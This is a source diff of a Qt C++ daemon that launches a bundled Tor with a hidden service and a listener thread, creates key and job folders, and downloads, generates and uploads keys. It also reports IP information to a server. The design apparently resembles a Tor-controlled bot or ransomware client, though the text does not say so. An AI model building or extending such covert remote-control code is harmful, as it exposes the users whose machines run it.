@@ -6,52 +6,38 @@ Daemon::Daemon(QObject *parent) :
 }
 
 void Daemon::startListener() {
-    if (listenStatus == 0) {
-    qDebug() << "starting Listener...";
+    qDebug() << "[*] Starting Listener...";
     QThread *thread = new QThread;
     Listener *listener = new Listener;
     listener->moveToThread(thread);
     QObject::connect(thread, SIGNAL(started()), listener, SLOT(start()));
     thread->start();
-    }
     emit ListenerStarted();
 }
 
 void Daemon::startTor() {
     QProcess process;
+    if (!QDir("tor/hidden_service").exists()) QDir().mkdir("tor/hidden_service");
     process.start("tor/tor.exe", QStringList() << "-f" << "tor/config");
     if (!process.waitForStarted()) return;
-    qDebug() << "starting Tor...";
+    qDebug() << "[*] Starting Tor...";
+    emit TorStarted();
     process.waitForFinished(-1);
     qDebug()<<"[*] Tor Stopped";
-    emit TorStarted();
-}
-
-void Daemon::checkStatus() {
-
-    //Please check this logic.
-
-    qDebug() << "[*] Checking...";
-    QThread::sleep(10);
-    if (localPortIsOpen(QHostAddress::LocalHost,4444)
-        && localPortIsOpen(QHostAddress::LocalHost,9250)
-        && localPortIsOpen(QHostAddress::LocalHost,9251))
-    { qDebug()<<"[*] OK"; init();}
-    else {
-        qDebug()<<"[*] NO";
-        init();
-        //emit finished();
-    }
+    emit finished();
 }
 
 void Daemon::init() {
     qDebug()<<"[*] Starting...";
-    Database *db = new Database;
-    if (!db->open()) return;
-    if (!db->createTable()) return;
-    db->close();
-    delete db;
-    db = NULL;
+    if (!QDir("keys").exists()) QDir().mkdir("keys");
+    if (!QDir("jobs").exists()) QDir().mkdir("jobs");
+    //Database *db = new Database;
+    //if (!db->open()) return;
+    //db->createTables();
+    //db->close();
+    //delete db;
+    //db = NULL;
+    QThread::sleep(10);
     if (!QFileInfo(PUBLICKEY).isFile()) {
         qDebug()<<"[DOWNLOAD KEY]";
         QThread *thread = new QThread();
@@ -64,13 +50,13 @@ void Daemon::init() {
         thread->start();
     }
     if (QFileInfo(MYPUBLICKEY).isFile()) {
-        setvalueDB("key", "1", "user");
-        if ((getvalueDB("email", "user") != "") && (getvalueDB("key_status", "user") != "1")) {
+        dbexec("update user set key='1'");
+        if ((dbselect("select email from user") != "") && (dbselect("select key_status from user") != "1")) {
             qDebug()<<"[SENDKEY]";
             QThread *thread2 = new QThread;
             Uploader *uploader = new Uploader;
             uploader->moveToThread(thread2);
-            QObject::connect(thread2, SIGNAL(started()), uploader, SLOT(sendkey()));
+            QObject::connect(thread2, SIGNAL(started()), uploader, SLOT(sendKey()));
             QObject::connect(uploader, SIGNAL(finished()), thread2, SLOT(quit()), Qt::DirectConnection);
             QObject::connect(thread2, SIGNAL(finished()), thread2, SLOT(deleteLater()));
             QObject::connect(thread2, SIGNAL(finished()), uploader, SLOT(deleteLater()));
@@ -78,19 +64,18 @@ void Daemon::init() {
         }
     }
     else {
-        setvalueDB("key", "0", "user");
-        if (!QDir("keys").exists()) QDir().mkdir("keys");
+        dbexec("update user set key='0'");
         qDebug()<<"[GENKEY]";
         QThread *thread3 = new QThread;
-        Client *client = new Client;
-        client->moveToThread(thread3);
-        QObject::connect(thread3, SIGNAL(started()), client, SLOT(genkey()));
-        QObject::connect(client, SIGNAL(finished()), thread3, SLOT(quit()), Qt::DirectConnection);
+        Uploader *uploader2 = new Uploader;
+        uploader2->moveToThread(thread3);
+        QObject::connect(thread3, SIGNAL(started()), uploader2, SLOT(genKey()));
+        QObject::connect(uploader2, SIGNAL(finished()), thread3, SLOT(quit()), Qt::DirectConnection);
+        QObject::connect(thread3, SIGNAL(finished()), uploader2, SLOT(deleteLater()));
         QObject::connect(thread3, SIGNAL(finished()), thread3, SLOT(deleteLater()));
-        QObject::connect(thread3, SIGNAL(finished()), client, SLOT(deleteLater()));
         thread3->start();
     }
-    if (getvalueDB("email", "user") != "") {
+    if (dbselect("select email from user") != "") {
         qDebug()<<"[SEND INFO]";
         QThread *thread4 = new QThread;
         Http *http = new Http(IP_INFO);
@@ -102,16 +87,4 @@ void Daemon::init() {
         thread4->start();
     }
     emit finished();
-}
-
-void Daemon::finish(int ret) {
-    emit finished(ret);
-}
-
-void Daemon::finish() {
-    emit finished();
-}
-
-void Daemon::hello() {
-    qDebug()<<"hello";
 }
